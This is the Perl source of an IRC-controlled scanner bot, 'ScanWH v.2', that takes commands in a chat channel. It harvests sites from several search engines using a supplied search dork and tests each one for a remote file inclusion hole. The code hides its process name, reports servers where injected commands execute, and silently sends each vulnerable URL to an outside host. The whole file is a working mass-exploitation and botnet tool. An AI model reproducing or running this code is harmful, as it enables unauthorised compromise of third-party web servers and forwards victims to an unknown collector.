#################################################################################################################################################
#!/usr/bin/perl

#мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм
#                                                                                                                 м
#                                      ScanWH v.2 by W4n73d H4ck3r                                                м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                                      Fazendo busca em: 7 sites.                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                              Google, Msn, All-The-Web, Uol, Altavista, FireBall, Ask                            м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                                              (__)                                                               м                    
#                                              /oo\\________                                                      м
#                                             \\- /        \\                                                     м                                   
#                                              \\/      /   \\                                                    м                                   
#                                               \\_|___\\_|/.\\                                                   м                  
#                                                 ||   YY| o '                                                    м
#                                                 ||    || O                                                      м
#                                                 ^^    ^^                                                        м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#                                PRIV8 PORRA! Nao passa pra ninguem PORRA! =)                                     м
#                                                                                                                 м
#                                                                                                                 м
#                                                                                                                 м
#мммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммммм

#################################################################################################################################################

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

##################### Inicio da Configuracao ##########################

my $processo = "[httpds]";
my $printcmd="[cmd]?";
my $server="irc.chatbr.org";
my $porta="6667";
my $nick="[Priv8]".(int(rand(100)));
my $chan="#ForceHacker";

##################### Final da Configuracao ###########################

my $verbot = "Priv8 v.2 by W4n73d H4ck3r";
my $cmd="http://?"; # Nao mudar a cmd, senao ja era, nao funfa o scan ;)
my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER ScanWH 8 *  : 14#1ownZ 1@4Vuln Scan1!\r\n";
print $sk "JOIN $chan\r\n";
print $sk "PRIVMSG $chan :15(12@1ScanWH15) 15Status1: 12%3ON15 .:. 14 c0ded by 1W144n73d 1H144ck3r 4;4]1\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

if ($line=~ /PRIVMSG $chan :!sairbot/){
stampa($sk, "QUIT");
}

############################################# Inicio Ajuda #############################################
if ($line=~ /PRIVMSG $chan :!ajuda/){
stampa($sk, "PRIVMSG $chan :12[1Ajuda12] 12%14Scanner RFI  1$verbot ");
stampa($sk, "PRIVMSG $chan :12[1Ajuda12] 12%14Para scannear 12!1scan Bug Dork");
stampa($sk, "PRIVMSG $chan :12[1Ajuda12] 12%14Para visualizar os sites de busca 12!1busca");
stampa($sk, "PRIVMSG $chan :12[1Ajuda12] 12%14Para killar o Bot 12!1sairbot");
}
############################################# Final Ajuda ##############################################

############################################# Inicio Busca #############################################
if ($line=~ /PRIVMSG $chan :!busca/){
stampa($sk, "PRIVMSG $chan :12[1Sites de Busca12] 12%1G14oogle, 1M14sn, 1F14ire1B14all, 1A14ltavista, 1A14ll1T14he1W14eb, 1A14sk, 1U14ol");
}
############################################# Final Busca ##############################################


if ($line=~ /PRIVMSG $chan :!scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contador=0;
my ($type,$space);
my %hosts;
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 1.:15Iniciando1:.");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1BUG15:14 $bug 12%1DORK15:14 $dork ");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1G12oogle15 Iniciando Buscas1!");
my @glistbr=&googlebr($dork);
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1M12sn15 Iniciando Buscas1!");
my @mlist=&msn($dork);
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1F12ire1B12all15 Iniciando Buscas1!");
my @firelist=&fireball($dork);
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1A12lta1V12ista15 Iniciando Buscas1!");
my @alist=&altavista($dork);
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1A12ll1T12he1W12eb15 Iniciando Buscas1!");
my @allist=&alltheweb($dork);
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1A12s12k15 Iniciando Buscas1!");
my @asklist=&ask($dork);
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1U12ol15 Iniciando Buscas1!");
my @uollist=&uol($dork);
my @msndelist=&msnde($dork);
my @glistuk=&googleuk($dork);
my @msnitlist=&msnit($dork);
my @askuklist=&askuk($dork);
my @askfrlist=&askfr($dork);
my @msnnllist=&msnnl($dork);
my @msnchlist=&msnch($dork);
my @glistde=&googlede($dork);
my @glistes=&googlees($dork);
my @glistit=&googleit($dork);
my @glistru=&googleru($dork);
my @alldeist=&altavistade($dork);
my @allistus=&altavistaus($dork);
my @allweb=&standard($dork);
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1BUG15:14 $bug 12%1DORK15:14 $dork ");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1M12sn15 ".scalar(@mlist)." 12Sites1! ");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1G12oogle15 ".scalar(@glistbr)." 12Sites1! ");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1F12ire1B12all15 ".scalar(@firelist)." 12Sites1! ");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1A12lta1V12ista15 ".scalar(@alist)." 12Sites1! ");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1A12ll1T12he1W12eb15 ".scalar(@allist)." 12Sites1! ");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1A12s12k15 ".scalar(@asklist)." 12Sites1! ");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1U12ol15 ".scalar(@uollist)." 12Sites1! ");
push(my @tot, @glistbr, @glistde,  @glistes, @glistit, @askuklist, @glistuk, @askfrlist, @glistru, @msnchlist, @msnnllist, @msnitlist, @msndelist, @mlist, @alist, @allist, @asklist, @uollist, @firelist, @alldeist, @allistus, @alltheweb, @allweb);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 14%15Total15:14 ".scalar(@tot)." 12Sites1! 2* 14%15Sites para teste15:14 ".scalar(@puliti)." 12Sites1!");
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 15%1Iniciando Testes14!");
my $uni=scalar(@puliti);
foreach my $site (@puliti)
{
$contador++;
if ($contador %100==0){
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%1Scanneado14 ".$contador." 15de14 ".scalar(@puliti)." ");
}
if ($contador==$uni-1){
stampa($sk, "PRIVMSG $chan :15(12@1ScanWH15) 12%4FINALIZADO15:14 $dork");
stampa($sk, "PRIVMSG $chan :15(12@4ATENCAO15)1: 14Flood no BOT1= 4!14Ban 4;15) ");
}
my $test="http://".$site.$bug.$cmd."?";
my $print="http://".$site.$bug.$printcmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space,$ker)=split(/\,/,$x);
stampa($sk, "PRIVMSG $chan :15(4XPL15) 14!1SAFEMODE15; 3OFF1 ->1 $print 2*  14!1Sistema15;12 ".$type." 14!31Livre15;12 ".$space." ");
checksafemode("$print");}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space,$ker)=split(/\,/,$x);
stampa($sk, "PRIVMSG $chan :15(4XPL15) 14!1SAFEMODE15; 4ON1 ->1$print 2*  14!1Sistema15;12 ".$type." 14!31Livre15;12 ".$space." ");
checksafemode("$print");}}
}}}
exit;
}}}


sub stampa()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

sub os(){
my $site=$_[0];
my $Res=query($site);
my $type;
my $space;
my $ker;
my $str;
while($Res=~m/<br>Sistema:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Kernel:(.+?)\<br>/g){
$ker=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$space=$1;
}
$str=$type.",".$space.",".$ker;
return $str;
}

######################################################################################################
#                                          Google                                                    #
######################################################################################################
sub googlebr(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.com.br/search?hl=pt&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub googleit(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub googleru(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.ru/search?hl=ru&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub googlees(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.es/search?hl=es&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub googlede(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.de/search?hl=de&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub googleuk(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.co.uk/search?hl=en&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

######################################################################################################
#                                          Altavista                                                 #
######################################################################################################
sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://br.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistade(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistaus(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

######################################################################################################
#                                            FIREBALL                                                #
######################################################################################################
sub fireball(){
my $key=$_[0];
my $inicio=1;
my $pagina=200;
my @lst;
my $av=0;
while($inicio <= $pagina){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8";
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inicio++;
}
return @lst;
}

######################################################################################################
#                                               MSN                                                  #
######################################################################################################
sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $msn=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PORE");
my $Res=query($msn);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub msnde(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $msn=("http://search.msn.de/results.aspx?q=".key($key)."&first=".$b."&FORM=PORE");
my $Res=query($msn);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub msnit(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $msn=("http://search.msn.it/results.aspx?q=".key($key)."&first=".$b."&FORM=PORE");
my $Res=query($msn);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub msnnl(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $msn=("http://search.msn.nl/results.aspx?q=".key($key)."&first=".$b."&FORM=PORE");
my $Res=query($msn);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub msnch(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $msn=("http://search.msn.ch/results.aspx?q=".key($key)."&first=".$b."&FORM=PORE");
my $Res=query($msn);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

######################################################################################################
#                                              ASK                                                   #
######################################################################################################
sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub askfr(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://fr.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub askuk(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://uk.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


######################################################################################################
#                                         All-The-Web                                                #
######################################################################################################
sub allthewebt {
my @lang = ("en","es","de","nl","pt-BR","it","de","fo");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $lang (@lang){
my @lista = alltheweb($key,$lang[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}


sub alltheweb(){
my @lista;
my $key = $_[0];
my $lang= $_[1];
for($b=0;$b<=500;$b+=100){
my $alltheweb=("http://www.alltheweb.com/search?cat=web&_sb_lang=".$lang."&hits=100&q=".key($key)."&o=".$b);
my $Res=query($alltheweb);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub standard()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


######################################################################################################
#                                             Uol                                                    #
######################################################################################################
sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chave=$_[0];
$chave =~ s/ /\+/g;
$chave =~ s/:/\%3A/g;
$chave =~ s/\//\%2F/g;
$chave =~ s/&/\%26/g;
$chave =~ s/\"/\%22/g;
$chave =~ s/,/\%2C/g;
$chave =~ s/\\/\%5C/g;
return $chave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub checksafemode($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"tckct.co.uk",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET /logfiles/CDPW3U1032/safe.php?url=$query HTTP/1.0\r\nHost: tckct.co.uk\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
}


sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}





